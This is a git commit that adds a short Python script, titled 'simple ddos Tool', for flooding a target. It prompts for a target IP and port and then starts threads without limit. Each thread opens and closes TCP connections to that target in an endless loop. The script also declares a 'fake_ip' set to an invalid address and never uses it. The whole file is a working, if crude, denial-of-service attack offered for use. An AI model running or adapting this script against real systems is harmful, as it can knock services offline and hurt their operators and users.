18ecb91e4189375acb59930762ea38412e212711
Vimalkumarr123 <143260951+Vimalkumarr123@users.noreply.github.com>
2023-10-09 16:39:29 +0530

    simple ddos Tool

---
+++ Ddos.py
@@ -0,0 +1,25 @@
+import socket
+from threading import Thread
+
+target = input("enter the target ip --->>") # enter your target ip  here
+fake_ip = '192.168.3.334' # this is fake ip address
+port = int(input("enter the port ---->>"))
+
+attack_num = 0
+
+def attack():
+	while True:
+	    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	    s.connect((target,port))
+	    
+	    global attack_num
+	    attack_num +=1
+	    print("number of connections send : " +" " + str(attack_num))
+	    s.close()
+	    
+	    
+while True:
+    for i in range(500):
+       thread = Thread(target=attack)
+       thread.start()
+    
